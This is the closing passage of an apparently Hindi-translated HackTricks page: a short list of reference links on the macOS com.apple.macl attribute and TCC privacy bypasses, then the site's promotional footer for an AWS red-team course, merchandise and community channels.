* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
